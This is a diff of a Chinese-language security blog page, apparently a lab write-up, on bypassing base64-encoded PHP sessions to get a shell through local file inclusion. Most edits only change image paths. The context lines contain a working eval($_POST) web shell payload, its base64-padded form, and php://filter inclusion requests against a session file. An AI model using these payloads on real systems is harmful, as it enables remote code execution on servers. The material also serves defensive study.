@@ -493,7 +493,7 @@ height:50vh;
 <p>解码包含serialize_handler=php处理过的原始session信息，未能正常解析执行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username|s:40:&quot;PD9waHAgZXZhbCgkX1BPU1RbJ210ZnEnXSk7Pz4&#x3D;&quot;;</span><br><span class="line"></span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_qfg3alueqlubqu59l822krh5pl</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img2020.cnblogs.com/blog/1594459/202003/1594459-20200313110552453-1553940744.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/1594459-20200313110552453-1553940744-1584413476857.png" alt></p>
 <p>依据base64编码和解码的特点进行分析，当session存储的信息中用户名编码后的长度为个位数时，<code>username|s:1:&quot;</code>这部分数据长度为14，实际解码为<code>usernames1</code>，实际长度为10，不满足情况。</p>
 <p>4组解码-&gt;缺少两个字节，后面需占两位（<code>X</code> 代表占位符）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username|s:1:&quot;  &#x2F;&#x2F;原始未处理信息</span><br><span class="line"></span><br><span class="line">user name s1XX  &#x2F;&#x2F;base64解码特点，去除特殊字符，填充两个字节&#39;XX&#39;</span><br></pre></td></tr></table></figure>
@@ -559,14 +559,14 @@ height:50vh;
 <p>base64编码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtPD9waHAgZXZhbCgkX1BPU1RbJ210ZnEnXSk7Pz4&#x3D;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img2020.cnblogs.com/blog/1594459/202003/1594459-20200313121223649-58947131.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/1594459-20200313121223649-58947131-1584413499315.png" alt></p>
 <p>编码测长</p>
-<p><img src="https://img2020.cnblogs.com/blog/1594459/202003/1594459-20200313121356731-1397855559.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/1594459-20200313121356731-1397855559-1584413509405.png" alt></p>
 <p>可以看到满足长度需求</p>
 <h3 id="bypass利用"><a href="#bypass利用" class="headerlink" title="bypass利用"></a>bypass利用</h3><p>构造payload传入恶意session</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.33.6.145&#x2F;FI&#x2F;session&#x2F;session.php</span><br><span class="line"></span><br><span class="line">POST：</span><br><span class="line">username&#x3D;qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm&lt;?php eval($_POST[&#39;mtfq&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img2020.cnblogs.com/blog/1594459/202003/1594459-20200313121822051-1296620878.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/1594459-20200313121822051-1296620878-1584413514895.png" alt></p>
 <p>构造payload包含恶意session</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.33.6.145&#x2F;FI&#x2F;session&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_7qefqgu07pluu38m45isiesq3s</span><br><span class="line"></span><br><span class="line">POST：</span><br><span class="line">mtfq&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
 
@@ -582,7 +582,7 @@ height:50vh;
             <p>Author：<a href="http://Qftm.github.io">Qftm</a>
             <p>原文链接：<a href="http://qftm.github.io/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/">http://qftm.github.io/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/</a>
             <p>发表日期：<a href="http://qftm.github.io/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/">March 12th 2020, 3:20:00 pm</a>
-            <p>更新日期：<a href="http://qftm.github.io/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/">March 17th 2020, 10:43:40 am</a>
+            <p>更新日期：<a href="http://qftm.github.io/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/">March 17th 2020, 10:53:06 am</a>
             <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
